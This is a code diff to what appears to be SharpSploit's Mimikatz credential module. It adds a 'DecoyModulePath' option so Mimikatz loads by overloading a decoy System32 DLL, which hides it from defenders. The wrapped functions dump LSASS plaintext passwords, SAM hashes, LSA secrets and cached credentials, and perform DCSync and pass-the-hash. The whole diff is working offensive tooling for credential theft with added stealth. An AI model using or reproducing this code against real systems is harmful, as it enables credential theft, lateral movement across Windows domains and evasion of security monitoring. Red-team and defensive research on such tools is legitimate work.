@@ -120,40 +120,44 @@ namespace SharpSploit.Credentials
         /// Loads the Mimikatz PE and executes the Mimikatz command to get some coffee.
         /// Equates to `Command("coffee")`.
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-        public static string Coffee()
+        public static string Coffee(string DecoyModulePath = null)
         {
-            return Command("coffee");
+            return Command("coffee", DecoyModulePath);
         }
 
         /// <summary>
         /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve plaintext
         /// passwords from LSASS. Equates to `Command("privilege::debug sekurlsa::logonPasswords")`. (Requires Admin)
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-        public static string LogonPasswords()
+        public static string LogonPasswords(string DecoyModulePath = null)
 		{
-			return Command("privilege::debug sekurlsa::logonPasswords");
+			return Command("privilege::debug sekurlsa::logonPasswords", DecoyModulePath);
 		}
 
         /// <summary>
         /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve password hashes
         /// from the SAM database. Equates to `Command("privilege::debug lsadump::sam")`. (Requires Admin)
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-		public static string SamDump()
+		public static string SamDump(string DecoyModulePath = null)
         {
-			return Command("token::elevate lsadump::sam");
+			return Command("token::elevate lsadump::sam", DecoyModulePath);
         }
 
         /// <summary>
         /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve LSA secrets
         /// stored in registry. Equates to `Command("privilege::debug lsadump::secrets")`. (Requires Admin)
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-		public static string LsaSecrets()
+		public static string LsaSecrets(string DecoyModulePath = null)
         {
-            return Command("token::elevate lsadump::secrets");
+            return Command("token::elevate lsadump::secrets", DecoyModulePath);
         }
 
         /// <summary>
@@ -161,20 +165,22 @@ namespace SharpSploit.Credentials
         /// Cached Credentials hashes from registry. Equates to `Command("privilege::debug lsadump::cache")`.
         /// (Requires Admin)
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-		public static string LsaCache()
+		public static string LsaCache(string DecoyModulePath = null)
         {
-            return Command("token::elevate lsadump::cache");
+            return Command("token::elevate lsadump::cache", DecoyModulePath);
         }
 
         /// <summary>
         /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Wdigest
         /// credentials from registry. Equates to `Command("sekurlsa::wdigest")`.
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-		public static string Wdigest()
+		public static string Wdigest(string DecoyModulePath = null)
         {
-            return Command("sekurlsa::wdigest");
+            return Command("sekurlsa::wdigest", DecoyModulePath);
         }
 
         /// <summary>
@@ -198,8 +204,9 @@ namespace SharpSploit.Credentials
         /// <param name="user">Username to retrieve NTLM hash for. "All" for all domain users.</param>
         /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
         /// <param name="DC">Optionally specify a specific Domain Controller to target for the dcsync.</param>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>The NTLM hash of the target user(s).</returns>
-        public static string DCSync(string user, string FQDN = null, string DC = null)
+        public static string DCSync(string user, string FQDN = null, string DC = null, string DecoyModulePath = null)
         {
             string command = "\"";
             command += "lsadump::dcsync";
@@ -225,7 +232,7 @@ namespace SharpSploit.Credentials
             }
             command += "\"";
 
-            return Command(command);
+            return Command(command, DecoyModulePath);
         }
 
         /// <summary>
@@ -236,8 +243,9 @@ namespace SharpSploit.Credentials
         /// <param name="NTLM">NTLM hash to authenticate the user.</param>
         /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
         /// <param name="run">The command to execute as the specified user.</param>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns></returns>
-        public static string PassTheHash(string user, string NTLM, string FQDN = null, string run = "cmd.exe")
+        public static string PassTheHash(string user, string NTLM, string FQDN = null, string run = "cmd.exe", string DecoyModulePath = null)
         {
             string command = "\"";
             command += "sekurlsa::pth";
@@ -253,7 +261,7 @@ namespace SharpSploit.Credentials
             command += " /ntlm:" + NTLM;
             command += " /run:" + run;
             command += "\"";
-            return Command(command);
+            return Command(command, DecoyModulePath);
         }
     }
 }
